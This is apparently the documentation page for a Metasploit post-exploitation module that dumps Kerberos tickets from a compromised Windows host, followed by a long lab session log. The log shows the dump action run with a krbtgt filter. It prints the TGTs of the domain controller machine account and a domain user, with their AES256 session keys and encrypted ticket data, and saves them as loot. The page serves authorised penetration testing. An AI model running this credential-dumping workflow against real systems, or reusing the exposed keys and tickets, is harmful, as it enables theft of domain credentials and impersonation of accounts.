Manage kerberos tickets on a compromised host. Different actions are available for different tasks. Kerberos tickets are
associated with logon sessions which can be enumerated with the `ENUM_LUIDS` action. s

## Options

### LUID
An optional logon session LUID to target in the DUMP_TICKETS and SHOW_LUID actions. The LUID is expressed in hex, e.g.
`0x11223344`.

### SERVICE
An optional service name wildcard to target in the DUMP_TICKETS action. This option accepts wild cards. For example, to
dump only TGTs use `krbtgt/*` and to only dump tickets for dc.msflab.local, use `*/dc.msflab.local`. Wildcards and 
service names are case insensitive.

## Actions

### DUMP_TICKETS
This action allows dumping kerberos tickets from a compromised host. These tickets are loaded into Metasploit's
kerberos ticket cache when Metasploit is connected to a database. If the Meterpreter session is running with
administrative privileges, then the tickets from all logon sessions can be dumped. If the Meterpreter session is not
running with Administrative privileges then only the tickets from the current logon session / current user can be
dumped. If the `LUID` option is set then only the tickets from that logon session will be dumped. Targeting a specific
LUID with the `LUID` option requires administrative privileges.

### ENUM_LUIDS
This action will enumerate the LUIDs of all active logon sessions. Some basic information is printed for each LUID.

### SHOW_LUID
This action will show the LUID and some basic information about the current logon session unless the `LUID` option is
set in which case that logon session is shown.

## Scenarios

In this case the operator lists the currently cached Kerberos tickets in the Metasploit database. After that the
`DUMP_TICKETS` action is used with a service filter to dump the TGTs on the compromised host. Finally, the `klist`
command is used again to show the newly added TGTs.

```
msf6 post(windows/manage/kerberos_tickets) > klist
Kerberos Cache
==============
No tickets

msf6 post(windows/manage/kerberos_tickets) > run SESSION=-1 SERVICE=krbtgt/*

[*] LSA Handle: 0x000001efe1bf7270
[*] LogonSession LUID: 0x00004bc1d 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:33:17 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135453_default_192.168.159.10_mit.kerberos.cca_948767.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: e515137250f072d44b7487c09b8033a34ff1c7e96ad20674007c255a0a8de2b0
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x60a10000 (FORWARDABLE, FORWARDED, RENEWABLE, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:17 -0400
              End time: 2023-08-23 18:33:17 -0400
              Renew Till: 2023-08-30 08:33:17 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  L/csyZle+LDn1i7Yqci0vbZCHrjO8CeQXBSix3d1lCR66sR0Zq/ogR/6g3X8yGn9acvGjAtt29ZErQe4FA3ttZ6MA2p8QldvbQCvELLpQkOHKrmzd2YhWy5YxfbwzFpZT0OtFEB0gYW3AQuOyRKk5vCuljZH6bPaz77g8KUejFx80tJbmz6n2GLOzG8rcMiy/i/zYreG6TLnjZJgw3UVABFSjUKs20eSK2Le5OxSKfcBQTwaRp+BPdXWGbMNYWwTUntAZGC5G6DE9xglY0+T2D/9HFSWVesrnduMmzHR9NojQYezHJorMKh7m5/KeNEzuJUDLCkgX/Uscq8dc6XMaFH7aIsg5+nlAZBPTrYtkayun6AaTLJpqLg90ab3iYCZpvdCBKBPapg3271YVHe8i7OaDDJWXMNooi+6Jg+B1cnBRH9qQ5T2k7RQLMNez9P8dvuMkDmFpRz5KOJk+w+Mz6XFeu9g1Z4zXQ6msI060PrwvAENevTN9DKUWtDGBCQMTjBDm75sMA7Aq8KgBqKYUhP+CV+HzgFou4P1/t3l+udRBIYfQw68EHW2dQE/ZZR+oLPPHbCsbnpkp/rSFjdsl0E9Zm4upPty3M+sKd2fdZSLXs5CLBs5WeZmPrXHrHnyC/AnoLNQVTVCtv5EpM50BWooXWKHljLctHxN/W6ZXgqwZ4R7KNYIrtaAsmLrkq2K/z+zsuAWRoDKFtLWZMD9eqfsGi2bRBqPf74+mi1bPXL/1eWlUwmrjr5Buj4kvC8XB+wTRoAkSrjoAx7IglfSIKdW/5N3CX6G+smJWZCsrGIvouTzIzcpHCXgoaHypnm2B9G7yIwkDgpCFd4MW3t8ZrZXOjuReQ6Aiy9mXHlbReX9G3Xl0fj7z4cIKSV4YiyEkjXJE+eAT7GdtJEPFXJJw6Fxhdam+FL+SKVvu4kw+uvqfz72GDG24/KqM3/0L58M96oEd1LHnVoHwuPtfDA7xhvHDu8iYZOkOjDc5cwMCU0MmW5A1cijTuNfSeRRHx6xXLPKkIJH/5XWeg7BAG3lnlOgS/HKj+Uhti7fabZHUvXyGAdA7CJzZ2OUlZY6Acm9JU2EuUfFvnpEjAtasckDA43pb/r4ZNIZPxcq6gpgcdFpZIb8H7bbWdIIinDJfFkEunJ7E1TG9wSbX6j6JfThG31L7EBW+UPHlDa4k1wPFMP3lNgleVUBi0n24T1RBTb6c5W0Cw==
[*] LogonSession LUID: 0x00001052b 
[*]   User:                  Window Manager\DWM-1
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:38 -0400
[*] LogonSession LUID: 0x00000aa83 
[*]   User:                  \
[*]   Session:               0
[*]   AuthenticationPackage: NTLM
[*]   LogonType:             UndefinedLogonType (0)
[*]   LogonTime:             2023-08-23 08:32:27 -0400
[-] Failed to call the authentication package. LsaCallAuthenticationPackage authentication package failed with: (0x00000520) ERROR_NO_SUCH_LOGON_SESSION: A specified logon session does not exist. It may already have been terminated.
[*] LogonSession LUID: 0x0000ae359 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:38:08 -0400
[*] LogonSession LUID: 0x0000ae2d3 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:38:08 -0400
[*] LogonSession LUID: 0x00004fff8 
[*]   User:                  MSFLAB\smcintyre
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:33:18 -0400
[*] LogonSession LUID: 0x00004b823 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:33:17 -0400
[*] LogonSession LUID: 0x00000b7c4 
[*]   User:                  Font Driver Host\UMFD-0
[*]   Session:               0
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:37 -0400
[*] LogonSession LUID: 0x0001f3e4f 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 09:42:34 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135459_default_192.168.159.10_mit.kerberos.cca_126280.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: e515137250f072d44b7487c09b8033a34ff1c7e96ad20674007c255a0a8de2b0
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x60a10000 (FORWARDABLE, FORWARDED, RENEWABLE, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:17 -0400
              End time: 2023-08-23 18:33:17 -0400
              Renew Till: 2023-08-30 08:33:17 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  L/csyZle+LDn1i7Yqci0vbZCHrjO8CeQXBSix3d1lCR66sR0Zq/ogR/6g3X8yGn9acvGjAtt29ZErQe4FA3ttZ6MA2p8QldvbQCvELLpQkOHKrmzd2YhWy5YxfbwzFpZT0OtFEB0gYW3AQuOyRKk5vCuljZH6bPaz77g8KUejFx80tJbmz6n2GLOzG8rcMiy/i/zYreG6TLnjZJgw3UVABFSjUKs20eSK2Le5OxSKfcBQTwaRp+BPdXWGbMNYWwTUntAZGC5G6DE9xglY0+T2D/9HFSWVesrnduMmzHR9NojQYezHJorMKh7m5/KeNEzuJUDLCkgX/Uscq8dc6XMaFH7aIsg5+nlAZBPTrYtkayun6AaTLJpqLg90ab3iYCZpvdCBKBPapg3271YVHe8i7OaDDJWXMNooi+6Jg+B1cnBRH9qQ5T2k7RQLMNez9P8dvuMkDmFpRz5KOJk+w+Mz6XFeu9g1Z4zXQ6msI060PrwvAENevTN9DKUWtDGBCQMTjBDm75sMA7Aq8KgBqKYUhP+CV+HzgFou4P1/t3l+udRBIYfQw68EHW2dQE/ZZR+oLPPHbCsbnpkp/rSFjdsl0E9Zm4upPty3M+sKd2fdZSLXs5CLBs5WeZmPrXHrHnyC/AnoLNQVTVCtv5EpM50BWooXWKHljLctHxN/W6ZXgqwZ4R7KNYIrtaAsmLrkq2K/z+zsuAWRoDKFtLWZMD9eqfsGi2bRBqPf74+mi1bPXL/1eWlUwmrjr5Buj4kvC8XB+wTRoAkSrjoAx7IglfSIKdW/5N3CX6G+smJWZCsrGIvouTzIzcpHCXgoaHypnm2B9G7yIwkDgpCFd4MW3t8ZrZXOjuReQ6Aiy9mXHlbReX9G3Xl0fj7z4cIKSV4YiyEkjXJE+eAT7GdtJEPFXJJw6Fxhdam+FL+SKVvu4kw+uvqfz72GDG24/KqM3/0L58M96oEd1LHnVoHwuPtfDA7xhvHDu8iYZOkOjDc5cwMCU0MmW5A1cijTuNfSeRRHx6xXLPKkIJH/5XWeg7BAG3lnlOgS/HKj+Uhti7fabZHUvXyGAdA7CJzZ2OUlZY6Acm9JU2EuUfFvnpEjAtasckDA43pb/r4ZNIZPxcq6gpgcdFpZIb8H7bbWdIIinDJfFkEunJ7E1TG9wSbX6j6JfThG31L7EBW+UPHlDa4k1wPFMP3lNgleVUBi0n24T1RBTb6c5W0Cw==
[*] LogonSession LUID: 0x0001243b3 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:47:47 -0400
[*] LogonSession LUID: 0x0000003e5 
[*]   User:                  NT AUTHORITY\LOCAL SERVICE
[*]   Session:               0
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Service (5)
[*]   LogonTime:             2023-08-23 08:32:38 -0400
[*] LogonSession LUID: 0x0000ae390 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:38:08 -0400
[*] LogonSession LUID: 0x0000ae320 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:38:08 -0400
[*] LogonSession LUID: 0x00000b7be 
[*]   User:                  Font Driver Host\UMFD-1
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:37 -0400
[*] LogonSession LUID: 0x00000b76e 
[*]   User:                  Font Driver Host\UMFD-0
[*]   Session:               0
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:37 -0400
[*] LogonSession LUID: 0x0000104e9 
[*]   User:                  Window Manager\DWM-1
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:38 -0400
[*] LogonSession LUID: 0x00000b77b 
[*]   User:                  Font Driver Host\UMFD-1
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:37 -0400
[*] LogonSession LUID: 0x0000003e7 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             UndefinedLogonType (0)
[*]   LogonTime:             2023-08-23 08:32:26 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_341258.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: 810290bb8e930190000e05de7abee1f095bfe29527cca5ad9320cf3d86260f08
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:17 -0400
              End time: 2023-08-23 18:33:17 -0400
              Renew Till: 2023-08-30 08:33:17 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  tLtOsjj8akj/iTEx/Kgidt9rW9sZ48SgEANNEpLhR1SmtI3/0e9Lq6oh35XWTKACrkFJGEOqSeBAaHwhArH2YyskGPadY2lL1qJI0zjhipeAZu4gWD4vpf2sKSL/ksOo9sthfxVMEVfq0QSxR37mPZwYI1LOyMcCOeckLGdHdlQCO7WwnbDpToyTq7TYzn13XmX0nyRFBIN436camSwYO/xRsWkhpVQKQIRgAjl7xCBMLT8/YGYangAASjBIxiXbXOtlj9zBwBjfA36cXz2yUp7MjC2kZLYI//xZZG1VVOa9nAG8vkkyi7GrXitG/m2X5s7YOG7XyvDOoC5yS7Yti+P2jGvPiWjAOSDmlwLolHSjeSIYCKwxK5Dm/LyMtUVtJRAb702FdI7lSH8oZCxQBQs92j3PKTBIMzz2+eY4r74Nemh+zIH86M4llhELhhyz86V9Utox9iURueY32LVieRIaTXmWXCGyopENrTt+LHPShBAk+Q8P3y+SGwVGxmm/CVKFN2R7IZNFiBxw627Vhw2pjFfVDjfsRV9mAvF6Axhks2aSO5rXZNZY1xW9iEbkRI3wnVYR9zgeSILxMNjyiVZvGFSllYnRWpDOqSe4n0/xw/ytD8gAHBYveBxzMPvTHN76Kcs1MGmhpsMdMBUo2UT4eeqBP//rXnuBtneb5maz0Ak+VwDZOf8Q76gcp66FIOGlRWPxpRgaCz2ISHeJ+istqRBm8gGbfqfHAbZM2PTzyyDHROuf3LgVyfhNUt8r7eYAgDCsfKBq6bq7O/KcQaBOfQN5yAgnt6CuAjyIqFaaXlsbQZ2D5s1p4WYUjrEpywWIoTQWLbCSYSAjOz+eYv50MQ3oE43hRQtg5eT0PCVmyG30VDfZDISq3Yj0hDMu20nuVuZ2cVvzccEBNgn9SRnQyYRRZQb6w9Zgs1/VYiY2SLZjmbYAo54TNDVJyseJ3Egl3Xp8BNccUkxZomgUOwP58q7XQk8lDzi4ApJMVJ0M8THDySVBJX2sB7oNn924fzghqW+wfzsXVnI2O9aLxzYnygHyp3h7ypt83sXyMTLD4tqEZ0DvcOvCoNnvis7VN8ZvvhLADoOxpJPALc8n+q70rfCdukZQpICUhLc16Z+JZJkGdAZtmi1Um+Cwy7lmBA+IvRp+abyklx19ulv55CbU7K8NAftJUOof/MgmAre+pOmwLofZgaSu7wVQ65fBeb8bjA==
[*]   Ticket[1]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_389858.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: 810290bb8e930190000e05de7abee1f095bfe29527cca5ad9320cf3d86260f08
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:17 -0400
              End time: 2023-08-23 18:33:17 -0400
              Renew Till: 2023-08-30 08:33:17 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  tLtOsjj8akj/iTEx/Kgidt9rW9sZ48SgEANNEpLhR1SmtI3/0e9Lq6oh35XWTKACrkFJGEOqSeBAaHwhArH2YyskGPadY2lL1qJI0zjhipeAZu4gWD4vpf2sKSL/ksOo9sthfxVMEVfq0QSxR37mPZwYI1LOyMcCOeckLGdHdlQCO7WwnbDpToyTq7TYzn13XmX0nyRFBIN436camSwYO/xRsWkhpVQKQIRgAjl7xCBMLT8/YGYangAASjBIxiXbXOtlj9zBwBjfA36cXz2yUp7MjC2kZLYI//xZZG1VVOa9nAG8vkkyi7GrXitG/m2X5s7YOG7XyvDOoC5yS7Yti+P2jGvPiWjAOSDmlwLolHSjeSIYCKwxK5Dm/LyMtUVtJRAb702FdI7lSH8oZCxQBQs92j3PKTBIMzz2+eY4r74Nemh+zIH86M4llhELhhyz86V9Utox9iURueY32LVieRIaTXmWXCGyopENrTt+LHPShBAk+Q8P3y+SGwVGxmm/CVKFN2R7IZNFiBxw627Vhw2pjFfVDjfsRV9mAvF6Axhks2aSO5rXZNZY1xW9iEbkRI3wnVYR9zgeSILxMNjyiVZvGFSllYnRWpDOqSe4n0/xw/ytD8gAHBYveBxzMPvTHN76Kcs1MGmhpsMdMBUo2UT4eeqBP//rXnuBtneb5maz0Ak+VwDZOf8Q76gcp66FIOGlRWPxpRgaCz2ISHeJ+istqRBm8gGbfqfHAbZM2PTzyyDHROuf3LgVyfhNUt8r7eYAgDCsfKBq6bq7O/KcQaBOfQN5yAgnt6CuAjyIqFaaXlsbQZ2D5s1p4WYUjrEpywWIoTQWLbCSYSAjOz+eYv50MQ3oE43hRQtg5eT0PCVmyG30VDfZDISq3Yj0hDMu20nuVuZ2cVvzccEBNgn9SRnQyYRRZQb6w9Zgs1/VYiY2SLZjmbYAo54TNDVJyseJ3Egl3Xp8BNccUkxZomgUOwP58q7XQk8lDzi4ApJMVJ0M8THDySVBJX2sB7oNn924fzghqW+wfzsXVnI2O9aLxzYnygHyp3h7ypt83sXyMTLD4tqEZ0DvcOvCoNnvis7VN8ZvvhLADoOxpJPALc8n+q70rfCdukZQpICUhLc16Z+JZJkGdAZtmi1Um+Cwy7lmBA+IvRp+abyklx19ulv55CbU7K8NAftJUOof/MgmAre+pOmwLofZgaSu7wVQ65fBeb8bjA==
[*] LogonSession LUID: 0x0000003e4 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Service (5)
[*]   LogonTime:             2023-08-23 08:32:37 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135507_default_192.168.159.10_mit.kerberos.cca_909298.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: b5c64f9aa85e1e31c9b17a28093bb39de235beeca53d844e10bbf4764cf7402e
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 09:32:46 -0400
              End time: 2023-08-23 19:32:46 -0400
              Renew Till: 2023-08-30 09:32:46 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  a5YMKhDbytSNzz+IqsxyXBURXqaCyVIpWDHu4E1wh0Q9MIVTXn163vkGYUz0X4LuxanqMXwttX8PdYI2V/Lxx6JcPzB50Jt0q4ffw0hsE/swVYEuRI8PyZl13DxE0wlGoaps9GC4l3xZM4nbqiAkPFneJQzrYgXcBWZ6ZlxJlQyGx7hOJLcsdU2KkqNOH8kRZrL/wkKNVKfHkDIkNPSkmYdSweZzuVce7v+yeNBOJpvK4odoE8ldWR6fhOGh5uSj5Fe2G+6ZG1IZREvnxMsqWQ/Ms3Os+1ZLZfH9l6sVi59MHufw98wxMFrKOBrceP0LkThwT29WXO3K3oCojYrSwLznMRKbKnUITRqzKT45a1wB/F556f4ova1GhUAmmlF7SxkGRlDuzh6c8zuKr91gaMQnzd1R95QSDl5xMP4HvWtz0N4bryhez8VbLlnUIFPdrhXtpOpp8Gp8cvEedwnmEmS7AUZyag8ohP40EgvtTXy8No8wuw0/imgIIhmRWlOvsTzUbRpoFMsNHS9h0+s6QhOyQdffMwqGea5c7inLpzJ2LofERlCvNrXVJpJ/+rkPGJasHzcnB216cFnSYuOUYzwIl9nSg1FY5jeOOOj5bcKptUuJonwldq/KJRKWq9io2bEJwOVwteBfRbz+E2KKShjWWMxS0sYhKLG1ZOUZtdLcUfwrwajexlJxM1aV48Y5yvDz7WWdxCOhNRmrjx2qmnOmbCNLgigJByqtcsUmeftfEZte5bdIWGECXOGFLsOdaLtUbW1mRPxDxHRuwTkcB4huzbtUk31pkljGDXp6LXUFOJD/IpJ3PNR6Xcf7jQ60QIkj99wT8xUHcNgJE/I9p8p5Y5EhgsY0KQOMu/OrFD0ah/VXoAl6vOS7INZXRrdVUFchBNKnRBX8aFBnIJ9pNjn1eLdGOrlpcd6HwCz9pCh9yJVs5kjxJWhOoyhOWWtNv/aghw0xPrvMTOTk8YRqe29hihpvHyMXJTKGTDvp6rkehWIC8G5/7XPcaeSuX6yKGUA6o6QaeTBLeiOHDH45AcapY12doQpxf7COrt31+U5xH6BxWwosp+I+axdf9cV63Z4lt2BToP5RZJvTIHe2gpn2trIuo40xkEQEMLKyvsI1frRG9hecUJzSXWXvTIkAwim54SY3rVcs6I6KUulNPyvXw2XVFCGSEb8XLfpl8zc3+gv7MB9Yv6T74M4rcF0guo62vQ==
[*]   Ticket[1]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135508_default_192.168.159.10_mit.kerberos.cca_938606.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: b5c64f9aa85e1e31c9b17a28093bb39de235beeca53d844e10bbf4764cf7402e
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 09:32:46 -0400
              End time: 2023-08-23 19:32:46 -0400
              Renew Till: 2023-08-30 09:32:46 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  a5YMKhDbytSNzz+IqsxyXBURXqaCyVIpWDHu4E1wh0Q9MIVTXn163vkGYUz0X4LuxanqMXwttX8PdYI2V/Lxx6JcPzB50Jt0q4ffw0hsE/swVYEuRI8PyZl13DxE0wlGoaps9GC4l3xZM4nbqiAkPFneJQzrYgXcBWZ6ZlxJlQyGx7hOJLcsdU2KkqNOH8kRZrL/wkKNVKfHkDIkNPSkmYdSweZzuVce7v+yeNBOJpvK4odoE8ldWR6fhOGh5uSj5Fe2G+6ZG1IZREvnxMsqWQ/Ms3Os+1ZLZfH9l6sVi59MHufw98wxMFrKOBrceP0LkThwT29WXO3K3oCojYrSwLznMRKbKnUITRqzKT45a1wB/F556f4ova1GhUAmmlF7SxkGRlDuzh6c8zuKr91gaMQnzd1R95QSDl5xMP4HvWtz0N4bryhez8VbLlnUIFPdrhXtpOpp8Gp8cvEedwnmEmS7AUZyag8ohP40EgvtTXy8No8wuw0/imgIIhmRWlOvsTzUbRpoFMsNHS9h0+s6QhOyQdffMwqGea5c7inLpzJ2LofERlCvNrXVJpJ/+rkPGJasHzcnB216cFnSYuOUYzwIl9nSg1FY5jeOOOj5bcKptUuJonwldq/KJRKWq9io2bEJwOVwteBfRbz+E2KKShjWWMxS0sYhKLG1ZOUZtdLcUfwrwajexlJxM1aV48Y5yvDz7WWdxCOhNRmrjx2qmnOmbCNLgigJByqtcsUmeftfEZte5bdIWGECXOGFLsOdaLtUbW1mRPxDxHRuwTkcB4huzbtUk31pkljGDXp6LXUFOJD/IpJ3PNR6Xcf7jQ60QIkj99wT8xUHcNgJE/I9p8p5Y5EhgsY0KQOMu/OrFD0ah/VXoAl6vOS7INZXRrdVUFchBNKnRBX8aFBnIJ9pNjn1eLdGOrlpcd6HwCz9pCh9yJVs5kjxJWhOoyhOWWtNv/aghw0xPrvMTOTk8YRqe29hihpvHyMXJTKGTDvp6rkehWIC8G5/7XPcaeSuX6yKGUA6o6QaeTBLeiOHDH45AcapY12doQpxf7COrt31+U5xH6BxWwosp+I+axdf9cV63Z4lt2BToP5RZJvTIHe2gpn2trIuo40xkEQEMLKyvsI1frRG9hecUJzSXWXvTIkAwim54SY3rVcs6I6KUulNPyvXw2XVFCGSEb8XLfpl8zc3+gv7MB9Yv6T74M4rcF0guo62vQ==
[*] LogonSession LUID: 0x00004ff91 
[*]   User:                  MSFLAB\smcintyre
[*]   Session:               1
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:33:18 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135509_default_192.168.159.10_mit.kerberos.cca_783228.bin
        Primary Principal: smcintyre@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: smcintyre@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: 074bf82534302378dd8d8f911ddab2afbf64b32e8093e4fdd833e683e427c361
            Subkey: false
            Ticket Length: 1052
            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:18 -0400
              End time: 2023-08-23 18:33:18 -0400
              Renew Till: 2023-08-30 08:33:18 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  oRWAAGpgwUBqsOzC3Xq8U5cNzsuFjB0ZLIgml5HqoGPgRwMtaDs9YIPNGudWsIvu+zl1aAIY6bkw3ltzW4/Ay2IuqQXKAMVnaWhTLWMNYViyPX4lUw5vrOvR6fpshI3tx46aqXNO5hnHPmNg+zAP9nKwXNG4hj3WtdCM3NMaLGShnQhvt9RnN/rEHuOQGn9Uo+3fEO01juPq9PBMJ/HGhe6dLXWFaXUc7OscSTQ5LUTlz+ABdbz2G0wCleEJPJYsQEo0tC1XDcZRcTsMkgbrAxp3H3zQGubEmX3h36Fo2H6ftYT0NsjnU1z/keylopjV6v0aRADUnqfJs+DgevOBDF0Ccy8IRsDdDVlnxr4tK7QwOvFUuIWKEPsLM2eLesNC7yJWnkDyHiFns+PNaz1PSIoD+euNRHFqW+7cPJXro3r84UcEiukKbWrMbrkg/YSQcEr9yGikNuoWSzgYCtbMsSLBRO7JasRcSNL+p4Dc3+E5r2nWRoR9bZTQM4YM72/kzoaXXnXXuPVx2krpohGMNJIHXoQ6drqCNwYcdT/tGMoCY+BLe29/PAtywGK3Hiq3HhbDnQ8t1g63b7CTssT0edrKR72Bv/YveDn3XQ1iKNM4mot+UxGVjrStJTQ6eEp1r3ZTibSvVTn3T5E1Z3ljSyHYhIa8bGlh2Ysk2St3ZEv3emDwDXvPIGovbzkqE7NYQgPlh36siynCV2SUKj1bApWA7erk7fVTyM/swH7OFa+ekZ+J88F02fanFtvrxGOhKOBfYL50UAas5o+32cqgIrPlip6JXe3BZ2fpr71mcZo4YYzUxopFYbox